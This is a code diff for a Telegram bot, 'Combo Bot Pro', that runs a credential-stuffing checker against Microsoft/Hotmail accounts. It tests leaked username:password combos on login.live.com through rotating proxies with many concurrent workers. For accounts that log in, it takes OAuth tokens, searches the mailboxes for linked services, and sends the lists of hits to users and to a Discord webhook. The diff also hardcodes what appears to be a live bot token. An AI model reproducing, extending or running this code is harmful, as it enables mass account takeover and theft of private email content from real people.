@@ -10,11 +10,11 @@ from datetime import datetime, timedelta
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
 
-# Check aiohttp availability
 try:
     import aiohttp
+    from aiohttp import DummyCookieJar, TCPConnector
 except ImportError:
-    print("[FATAL] aiohttp is not installed! Run: pip install aiohttp")
+    print("[FATAL] aiohttp not installed! Run: pip install aiohttp")
     raise
 
 try:
@@ -26,11 +26,11 @@ except ImportError:
 try:
     from flask import Flask, jsonify
 except ImportError:
-    print("[FATAL] Flask is not installed! Run: pip install flask")
+    print("[FATAL] Flask not installed! Run: pip install flask")
     raise
 
 # ═══════════════════════════════════════════════════════════
-# CONFIGURATION
+# CONFIGURATION (Load from env or use defaults)
 # ═══════════════════════════════════════════════════════════
 API_TOKEN = os.environ.get("BOT_TOKEN", "8814848831:AAEo3Ui19kB30X93-Cuzugzoi4rdfvpwCjw")
 ADMIN_ID = int(os.environ.get("ADMIN_ID", "8703458182"))
@@ -42,18 +42,13 @@ DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com
 bot = AsyncTeleBot(API_TOKEN)
 
 # ═══════════════════════════════════════════════════════════
-# FLASK APP (Web Server for Render keepalive)
+# FLASK APP (Main process for Render)
 # ═══════════════════════════════════════════════════════════
 app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return jsonify({
-        "status": "running",
-        "bot": "Combo Bot Pro",
-        "service": "hotmail_checker",
-        "timestamp": datetime.now().isoformat()
-    })
+    return jsonify({"status": "running", "bot": "Combo Bot Pro", "timestamp": datetime.now().isoformat()})
 
 @app.route('/health')
 def health():
@@ -73,19 +68,13 @@ def stats():
         cursor.execute("SELECT SUM(hits) FROM hotmail_checks")
         total_hits = cursor.fetchone()[0] or 0
         conn.close()
-        return jsonify({
-            "total_users": total_users,
-            "total_vips": total_vips,
-            "total_checks": total_checks,
-            "total_hits": total_hits
-        })
+        return jsonify({"total_users": total_users, "total_vips": total_vips, "total_checks": total_checks, "total_hits": total_hits})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
 def run_flask():
     port = int(os.environ.get('PORT', 8080))
     print(f"[*] Flask server starting on port {port}...")
-    # Use threaded=True for Render compatibility
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
 
 # ═══════════════════════════════════════════════════════════
@@ -570,7 +559,7 @@ class ProxyManager:
                 seen.add(p)
                 unique.append(p)
         self.proxies = unique
-        print(f"[*] Loaded {len(self.proxies)} unique proxies")
+        print(f"[*] Loaded {len(self.proxies)} unique proxies | Alive: {len(self.proxies) - len(self.dead_proxies)}")
 
     def _normalize_proxy(self, proxy_str):
         proxy_str = proxy_str.strip()
@@ -590,16 +579,20 @@ class ProxyManager:
             available = [p for p in self.proxies if p not in self.dead_proxies]
             if not available:
                 return None
-            return random.choice(available)
+            proxy = random.choice(available)
+            print(f"[PROXY] Using: {proxy[:40]}...")
+            return proxy
 
     async def mark_dead(self, proxy):
         async with self.lock:
-            self.dead_proxies.add(proxy)
-            print(f"[!] Proxy marked dead: {proxy[:30]}...")
+            if proxy not in self.dead_proxies:
+                self.dead_proxies.add(proxy)
+                alive = len(self.proxies) - len(self.dead_proxies)
+                print(f"[!] Proxy DEAD: {proxy[:40]}... | Alive remaining: {alive}")
 
     async def get_alive_count(self):
         async with self.lock:
-            return len([p for p in self.proxies if p not in self.dead_proxies])
+            return len(self.proxies) - len(self.dead_proxies)
 
     def has_proxies(self):
         return len(self.proxies) > 0
@@ -644,7 +637,7 @@ async def send_file_to_discord(file_path, filename, target_info, count, user_inf
         return False
 
 # ═══════════════════════════════════════════════════════════
-# ASYNC HOTMAIL CHECKER CLASS (Restructured with Proxies & Speed)
+# ASYNC HOTMAIL CHECKER (FIXED: DummyCookieJar + Proxy Logging)
 # ═══════════════════════════════════════════════════════════
 class AsyncHotmailChecker:
     def __init__(self, chat_id, bot_instance, proxy_manager=None):
@@ -667,8 +660,10 @@ class AsyncHotmailChecker:
         self.last_update = 0
         self.combo_file = None
         self.hits_file = None
-        max_concurrent = 20 if (proxy_manager and proxy_manager.has_proxies()) else 5
-        self.semaphore = asyncio.Semaphore(max_concurrent)
+        # Concurrency: 25 with proxies, 5 without
+        self.max_workers = 25 if (proxy_manager and proxy_manager.has_proxies()) else 5
+        self.semaphore = asyncio.Semaphore(self.max_workers)
+        print(f"[*] Checker initialized | Workers: {self.max_workers} | Proxies: {proxy_manager.has_proxies() if proxy_manager else False}")
 
     def make_progress_bar(self, percentage):
         percentage = max(0.0, min(100.0, percentage))
@@ -677,17 +672,31 @@ class AsyncHotmailChecker:
         bar = "█" * filled + "▒" * empty
         return f"[{bar}] {percentage:.1f}%"
 
-    async def _check_account(self, username, password, session, max_retries=3):
+    async def _check_single(self, username, password):
+        """Check one account. Returns: HIT, BAD, BAN, 2FA, CUSTOM, RETRY"""
         if self.cancelled:
             return "CANCELLED"
 
-        for attempt in range(max_retries):
-            proxy_url = None
-            if self.proxy_manager:
-                proxy_url = await self.proxy_manager.get_proxy()
+        proxy_url = None
+        if self.proxy_manager:
+            proxy_url = await self.proxy_manager.get_proxy()
+
+        # Use DummyCookieJar to PREVENT cookie contamination between accounts!
+        # Each account gets a fresh session with no shared cookies
+        connector = TCPConnector(limit=1, force_close=True, enable_cleanup_closed=True)
+        cookie_jar = DummyCookieJar()
+        timeout = aiohttp.ClientTimeout(total=35, connect=10)
+
+        async with aiohttp.ClientSession(
+            connector=connector,
+            cookie_jar=cookie_jar,
+            timeout=timeout
+        ) as session:
 
             try:
+                # ═══ STEP 1: Login to Microsoft ═══
                 login_url = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={username}&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
+
                 payload = {
                     'ps': '2', 'psRNGCDefaultType': '', 'psRNGCEntropy': '', 'psRNGCSLK': '',
                     'canary': '', 'ctx': '', 'hpgrequestid': '',
@@ -698,6 +707,7 @@ class AsyncHotmailChecker:
                     'type': '11', 'LoginOptions': '1', 'lrt': '', 'lrtPartition': '',
                     'hisRegion': '', 'hisScaleUnit': '', 'passwd': password
                 }
+
                 headers = {
                     'Origin': 'https://login.live.com',
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -710,43 +720,51 @@ class AsyncHotmailChecker:
                     'Cookie': 'MSPRequ=id=N&lt=1716447264&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-13a3c70b-5026-45a1-84df-99ba880a29e1'
                 }
 
-                kwargs = {}
+                req_kwargs = {}
                 if proxy_url:
-                    kwargs['proxy'] = proxy_url
+                    req_kwargs['proxy'] = proxy_url
 
-                async with session.post(login_url, data=payload, headers=headers, allow_redirects=False, **kwargs) as response:
-                    response_text = await response.text()
-                    cookies = response.cookies
-                    response_headers = response.headers
+                async with session.post(login_url, data=payload, headers=headers, allow_redirects=False, **req_kwargs) as resp:
+                    response_text = await resp.text()
+                    cookies = resp.cookies
+                    response_headers = resp.headers
 
+                # Check immediate failures
                 if "Your account or password is incorrect." in response_text or \
                    "That Microsoft account doesn't exist." in response_text or \
                    "Sign in to your Microsoft account" in response_text:
                     return "BAD"
+
                 if ",AC:null,urlFedConvertRename" in response_text:
                     return "BAN"
+
                 if "account.live.com/recover?mkt" in response_text or \
                    "recover?mkt" in response_text or \
                    "account.live.com/identity/confirm?mkt" in response_text or \
                    "Email/Confirm?mkt" in response_text:
                     return "2FA"
+
                 if "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
                     return "CUSTOM"
 
-                success_cookies = 'ANON' in str(cookies) or 'WLSSC' in str(cookies)
+                # Check success indicators
+                success_cookies = 'ANON' in cookies or 'WLSSC' in cookies
                 success_address = 'https://login.live.com/oauth20_desktop.srf?' in response_headers.get('Location', '')
 
                 if not (success_cookies or success_address):
                     return "BAD"
 
+                # Extract refresh_token from Location header
                 location = response_headers.get('Location', '')
                 refresh_token = None
 
                 if 'refresh_token=' in location:
                     start = location.find('refresh_token=') + len('refresh_token=')
                     end = location.find('&', start)
-                    if end == -1: end = len(location)
+                    if end == -1: 
+                        end = len(location)
                     refresh_token = location[start:end]
+
                 if not refresh_token and '#' in location:
                     try:
                         fragment = location.split('#')[1]
@@ -754,9 +772,11 @@ class AsyncHotmailChecker:
                         refresh_token = params.get('refresh_token')
                     except:
                         pass
+
                 if not refresh_token:
                     return "BAD"
 
+                # ═══ STEP 2: Get access token ═══
                 token_url = "https://login.live.com/oauth20_token.srf"
                 token_payload = {
                     'grant_type': 'refresh_token',
@@ -775,17 +795,18 @@ class AsyncHotmailChecker:
                     'Accept-Encoding': 'gzip'
                 }
 
-                async with session.post(token_url, data=token_payload, headers=token_headers, **kwargs) as token_response:
-                    if token_response.status != 200:
+                async with session.post(token_url, data=token_payload, headers=token_headers, **req_kwargs) as token_resp:
+                    if token_resp.status != 200:
                         return "BAD"
                     try:
-                        token_data = await token_response.json()
+                        token_data = await token_resp.json()
                         access_token = token_data.get('access_token')
                         if not access_token:
                             return "BAD"
                     except:
                         return "BAD"
 
+                # ═══ STEP 3: Search emails for services ═══
                 outlook_headers = {
                     'User-Agent': 'Outlook-Android/2.0',
                     'Pragma': 'no-cache',
@@ -843,14 +864,16 @@ class AsyncHotmailChecker:
                     }
 
                     try:
-                        async with session.post(search_url, json=search_payload, headers=outlook_headers, **kwargs) as search_response:
-                            if search_response.status == 200:
-                                search_data = await search_response.json()
+                        async with session.post(search_url, json=search_payload, headers=outlook_headers, **req_kwargs) as search_resp:
+                            if search_resp.status == 200:
+                                search_data = await search_resp.json()
                                 total_msgs = 0
                                 if 'EntityRequests' in search_data and len(search_data['EntityRequests']) > 0:
                                     entity_data = search_data['EntityRequests'][0]
                                     if 'Total' in entity_data:
                                         total_msgs = int(entity_data['Total'])
+
+                                # Fallback: parse raw JSON text
                                 search_text = json.dumps(search_data)
                                 if '"Total":' in search_text:
                                     try:
@@ -860,6 +883,7 @@ class AsyncHotmailChecker:
                                         total_msgs = int(total_str)
                                     except:
                                         pass
+
                                 if total_msgs > 0:
                                     found_links.append(service)
                     except Exception:
@@ -875,35 +899,27 @@ class AsyncHotmailChecker:
                 else:
                     return "CUSTOM"
 
-            except aiohttp.ClientProxyConnectionError:
+            except aiohttp.ClientProxyConnectionError as e:
+                print(f"[!] Proxy connection error for {username}: {e}")
                 if proxy_url and self.proxy_manager:
                     await self.proxy_manager.mark_dead(proxy_url)
-                if attempt < max_retries - 1:
-                    await asyncio.sleep(1)
-                    continue
                 return "RETRY"
             except asyncio.TimeoutError:
+                print(f"[!] Timeout for {username}")
                 if proxy_url and self.proxy_manager:
                     await self.proxy_manager.mark_dead(proxy_url)
-                if attempt < max_retries - 1:
-                    await asyncio.sleep(1)
-                    continue
                 return "RETRY"
             except Exception as e:
-                print(f"[!] Check error for {username}: {e}")
-                if attempt < max_retries - 1:
-                    await asyncio.sleep(0.5)
-                    continue
+                print(f"[!] Error checking {username}: {e}")
                 return "RETRY"
 
-        return "RETRY"
-
-    async def check_account(self, username, password, session):
+    async def check_account(self, username, password):
+        """Wrapper with semaphore and stats tracking"""
         async with self.semaphore:
             if self.cancelled:
                 return "CANCELLED"
 
-            result = await self._check_account(username, password, session)
+            result = await self._check_single(username, password)
 
             async with self.lock:
                 self.checked += 1
@@ -918,12 +934,14 @@ class AsyncHotmailChecker:
                 elif result == "RETRY":
                     self.retries += 1
 
+            # Update status periodically
             now = time.time()
             update_interval = 2 if self.total > 100 else 3
             if (self.checked % 5 == 0 or now - self.last_update > update_interval) and self.status_msg_id:
                 self.last_update = now
                 await self.update_status()
 
+            # Small delay to avoid rate limiting
             await asyncio.sleep(0.05)
             return result
 
@@ -971,11 +989,18 @@ class AsyncHotmailChecker:
         if self.total == 0:
             return
 
-        timeout = aiohttp.ClientTimeout(total=30)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            tasks = [self.check_account(u, p, session) for u, p in combos]
-            await asyncio.gather(*tasks, return_exceptions=True)
+        print(f"[*] Starting check: {self.total} combos | Workers: {self.max_workers}")
 
+        # Launch all tasks concurrently with semaphore control
+        tasks = [self.check_account(u, p) for u, p in combos]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+
+        # Log any exceptions
+        for i, res in enumerate(results):
+            if isinstance(res, Exception):
+                print(f"[!] Task {i} exception: {res}")
+
+        # Save results
         if self.hit_results:
             hits_file = f"Hotmail_Hits_{self.chat_id}_{int(time.time())}.txt"
             with open(hits_file, "w", encoding="utf-8") as f:
@@ -983,6 +1008,7 @@ class AsyncHotmailChecker:
                     services = ", ".join(hit["services"])
                     f.write(f"{hit['username']}:{hit['password']} | {services}\n")
             self.hits_file = hits_file
+            print(f"[+] Saved {self.hits} hits to {hits_file}")
         else:
             self.hits_file = None
 
@@ -990,6 +1016,7 @@ class AsyncHotmailChecker:
         log_hotmail_check(self.chat_id, os.path.basename(combo_file_path), 
                          "completed" if not self.cancelled else "cancelled",
                          self.hits, self.twofactor, self.custom, self.bad, self.total, platforms_str)
+        print(f"[*] Check complete: H:{self.hits} 2F:{self.twofactor} C:{self.custom} B:{self.bad} R:{self.retries}")
 
 # ═══════════════════════════════════════════════════════════
 # HELPERS
@@ -1071,9 +1098,10 @@ async def start_hotmail_check(chat_id, file_path, msg_id):
         await bot.edit_message_text(f"{EMOJI['no']} <b>لا يوجد كومبو صالح في الملف.</b>", chat_id, msg_id, parse_mode='HTML')
         return
 
+    # Initialize proxy manager for this user
     proxy_manager = ProxyManager(chat_id)
     if not proxy_manager.has_proxies():
-        proxy_manager = ProxyManager(None)
+        proxy_manager = ProxyManager(None)  # Try global proxies
 
     checker = AsyncHotmailChecker(chat_id, bot, proxy_manager)
     active_checks[chat_id] = checker
@@ -1085,6 +1113,7 @@ async def start_hotmail_check(chat_id, file_path, msg_id):
     try:
         await checker.run_check(file_path, status_msg.message_id)
 
+        # Send results
         elapsed = time.time() - checker.start_time
         done_text = t['hotmail_done'].format(
             hits=checker.hits, twofactor=checker.twofactor, custom=checker.custom,
@@ -1094,10 +1123,12 @@ async def start_hotmail_check(chat_id, file_path, msg_id):
         markup = get_main_menu_markup(user, chat_id)
         await bot.edit_message_text(done_text, chat_id, status_msg.message_id, parse_mode='HTML', reply_markup=markup)
 
+        # Send hits file if exists
         if checker.hits_file and os.path.exists(checker.hits_file):
             with open(checker.hits_file, "rb") as f:
                 await bot.send_document(chat_id, f, caption=f"{EMOJI['fire']} <b>Hotmail Hits - {checker.hits} accounts</b>", parse_mode='HTML')
 
+            # Send to Discord
             user_info = f"@{user['username']}" if user.get('username') else f"ID:{chat_id}"
             platforms_str = ", ".join(checker.all_platforms) if checker.all_platforms else "None"
             discord_ok = await send_file_to_discord(
@@ -1121,6 +1152,8 @@ async def start_hotmail_check(chat_id, file_path, msg_id):
 
     except Exception as e:
         print(f"Hotmail check error: {e}")
+        import traceback
+        traceback.print_exc()
         await bot.edit_message_text(f"{EMOJI['no']} <b>خطأ في الفحص: {e}</b>", chat_id, status_msg.message_id, parse_mode='HTML')
     finally:
         active_checks.pop(chat_id, None)
@@ -1853,27 +1886,42 @@ async def handle_document(message: Message):
     await bot.reply_to(message, f"{EMOJI['warning']} <b>يرجى استخدام الأزرار أو إرسال رابط مباشر.</b>", parse_mode='HTML')
 
 # ═══════════════════════════════════════════════════════════
-# MAIN
+# MAIN - Render Compatible (Flask as main, Bot in background)
 # ═══════════════════════════════════════════════════════════
-async def main():
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
 
-    print("[*] Bot is starting...")
-    print(f"[*] Loaded {len(SV)} platforms for Hotmail checking")
-    print(f"[*] Admin ID: {ADMIN_ID}")
-    print(f"[*] Channel: {CHANNEL_USERNAME}")
-    print(f"[*] Flask server started in background thread")
-    print(f"[*] Proxy support enabled with smart rotation")
-    await bot.infinity_polling(timeout=60)
+def run_bot_polling():
+    """Run bot polling in a separate thread with its own event loop"""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+
+    async def bot_main():
+        print("[*] Bot polling started in background thread...")
+        print(f"[*] Loaded {len(SV)} platforms for Hotmail checking")
+        print(f"[*] Admin ID: {ADMIN_ID}")
+        print(f"[*] Channel: {CHANNEL_USERNAME}")
+        print(f"[*] Proxy support enabled with smart rotation")
+        await bot.infinity_polling(timeout=60)
+
+    try:
+        loop.run_until_complete(bot_main())
+    except Exception as e:
+        print(f"[-] Bot polling error: {e}")
+    finally:
+        loop.close()
 
 if __name__ == '__main__':
     while True:
         try:
-            asyncio.run(main())
+            # Start bot in background thread
+            bot_thread = threading.Thread(target=run_bot_polling, daemon=True)
+            bot_thread.start()
+
+            # Start Flask as main process - Render expects this to bind to PORT
+            print("[*] Starting Flask main server for Render...")
+            run_flask()
         except KeyboardInterrupt:
             print("\n[*] Bot stopped by user.")
             break
         except Exception as e:
-            print(f"[-] Error: {e}")
+            print(f"[-] Main error: {e}")
             time.sleep(5)
